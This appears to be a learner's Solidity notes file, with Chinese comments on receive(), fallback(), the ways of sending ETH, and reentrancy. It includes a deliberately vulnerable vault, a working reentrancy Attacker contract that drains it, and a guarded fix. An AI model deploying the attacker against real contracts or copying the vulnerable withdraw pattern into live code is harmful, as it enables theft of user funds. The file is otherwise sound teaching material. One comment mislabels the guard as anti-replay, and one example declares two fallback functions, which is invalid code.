


// SPDX-License-Identifier: MIT
pragma solidity ^0.8;


/*
特性	          receive()	              fallback()
是否能接收 ETH	是（必须是 payable）	 可选（payable 或不写）
是否接收 data	否（data 必须为空）	     是（data 非空或无函数匹配）
是否必须存在	否（可选）	               否（可选）
常见触发条件	纯 ETH 转账，无数据	错误调用或带 data 转账
*/
contract MyContract {  // 收款方式
    event Received(address sender, uint amount);

    receive() external payable {  // 只接收eth
        emit Received(msg.sender, msg.value);
    }

    event FallbackCalled(address sender, uint amount, bytes data);

    fallback() external payable {  // 对任何未知调用做处理（比如 proxy、日志记录）
        emit FallbackCalled(msg.sender, msg.value, msg.data);
    }
    // 如果两个都写了会优先调用receive 在data为空时调用fallback

    // function funcName() public payable returns (uint) {
    //     return address(this).balance;
    // }
}


contract Vault {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }

    // 转账
    // payable(msg.sender).transfer(1 ether);  固定 2300 gas，失败自动 revert

    // bool success = payable(msg.sender).send(1 ether); 只提供 2300 gas，但需要手动检查返回值
    // require(success, "Send failed");

    // (bool success, ) = payable(msg.sender).call{value: 1 ether}("");  
    // require(success, "Call failed");                可调 gas，兼容新版本，官方推荐方式

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}


// VulnerableVault.sol
contract VulnerableVault {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "No balance");

        // 发送 ETH（外部调用，容易被攻击者重入）
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer failed");

        // 更新余额（放在调用后，导致漏洞）
        balances[msg.sender] = 0;
    }
}


// Attacker.sol
contract Attacker {
    VulnerableVault public target;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    // 回调函数，趁机再次提取
    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}


import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
// 防重放攻击
contract SecureVault is ReentrancyGuard {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint amount = balances[msg.sender];
        require(amount > 0, "No balance");
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}


/**



转账份两类

外部账户（EOA）：由私钥控制的用户账户。它没有代码，发送 ETH 到另一个 EOA 是一个简单的余额增减操作。

合约账户（CA）：由代码控制的账户。当你向一个合约地址发送 ETH 时，
        EVM（以太坊虚拟机）需要知道应该执行合约中的哪一段代码来处理这笔资金。


msg.data就是用来承载“数据”或“调用指令”的字段。


msg.data为空时
目的非常单纯 --> ​​发送 ETH​​，而不是与合约逻辑交互
如果合约存在 receive()函数，则会执行它。
如果不存在 receive()函数但存在 fallback()函数，则会执行 fallback()函数。
如果两个函数都不存在，​​交易会失败并回退（Revert）​​。
这就是为什么你的合约如果想要接收普通转账，必须至少包含一个 receive()或 payable的 fallback()函数。


当 msg.data​​不​​为空时
在钱包中与合约交互并​​调用了某个函数​​（如 approve(), transfer(), mint()等）。
手动构造了一笔包含​​调用数据​​（Calldata）的交易。
msg.data包含了要调用的​​函数选择器​​（Function Selector）和​​编码后的参数​​
例如，调用 transfer(addr, 100)会生成类似 0xa9059cbb...的 msg.data
目的是​​执行合约的特定功能​​。这笔交易可能会附带 ETH，也可能不附带
EVM 会解码 msg.data，找到对应的函数并执行它。如果找不到匹配的函数，则会尝试执行 fallback()函数


*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Example {
    // 当 msg.data 为空 且 接收了ETH时，调用这个函数
    // 必须使用 receive 关键字。
    // 必须标记为 external payable。
    // 不能有任何参数。
    // 不能返回任何值。
    receive() external payable {
        // 这里通常只处理最简单的ETH接收逻辑
    }

    // 当 msg.data 不为空 或 msg.data为空但receive()不存在时，调用这个函数
    // 是一个全能后备函数，它有两种工作模式，具体取决于是否标记为 payable。
    // 当调用数据（msg.data）为空，但合约没有实现 receive() 函数时。
    // 当调用数据不为空，但调用了一个不存在的函数，且这个调用附带了 ETH时。
    // 没有参数，没有返回值
    fallback() external payable {
        // 这里可以处理未知函数调用或更复杂的接收逻辑
    }

    // 当调用数据不为空，但调用了一个不存在的函数，且这个调用没有附带 ETH时。
    // 有人尝试向这个函数发送 ETH（例如，通过不存在的函数调用并附带 ETH），交易将会 revert
    fallback() external {
        // 这里可以处理未知函数调用或更复杂的接收逻辑
    }

    // 一个普通函数调用，msg.data 将包含 transfer 的函数选择器和参数
    function transfer(address to, uint amount) external {
        // ... 转账逻辑
    }
}









/*


payableAddress.transfer(uint256)//  从当前合约余额 向  payableAddress 转 指定数量的 wei
1 Ether = 10^18 Wei
如果发送失败，整个交易会被完全回滚
当使用 transfer 发送以太币时，交易被允许消耗的 Gas 量被硬性限制在 2300 Gas。
这个 Gas 数量只够目标地址（通常是一个外部账户或最简易的合约）执行一个最基本的日志事件（log）操作。

如果接收方是一个合约，并且其 receive() 或 fallback() 函数需要消耗超过 2300 Gas 来执行
        （例如，它包含复杂的逻辑、存储操作或再次调用其他合约），那么 transfer 会失败。

2300 Gas 的防护作用：由于 2300 Gas 非常少，只够记录一个日志，
攻击者几乎无法在这么少的 Gas 下完成重入攻击所需的复杂操作（如再次调用函数、修改存储等），从而极大地提高了安全性。


如果 transfer 在一个循环中，其中某一步发生了问题，会导致整个所有的操作都回滚，包括之前没问题的操作

----transfer问题------
Gas 限制过于僵化：随着以太坊网络的发展和操作码 Gas 成本的变化，2300 Gas 可能变得不足。
  如果接收方是一个具有复杂 receive 函数的合约（例如，它需要更新一些内部状态），
  即使没有任何恶意，transfer 也注定会失败，导致无法向其付款。

可能破坏智能合约之间的兼容性：它假设所有接收方都是最简易的，这与现代智能合约生态的复杂性不符。

不兼容某些合约：一些广泛使用的合约（如 Gnosis Safe 多签钱包）的接收函数所需的 gas 超过了 2300。
  如果你用 transfer() 向它们发送资金，交易会永远失败。

----transfer现在用途------
向明确知道是外部账户（EOA）的地址发送资金
非常确定 2300 Gas 足够且希望利用其自动回滚特性的一些特定场景


----call------
call  --->  _to.call{value: msg.value, gas: 50000}("");
允许你手动指定 Gas（例如 gas: 50000），这解决了 transfer 因 Gas 不足而导致合法交易失败的问题。
不会自动回滚，而是返回一个 bool success，让你可以更灵活地处理失败情况（例如，只是记录日志而不是让整个交易回滚）。
必须做好重入攻击防护

 */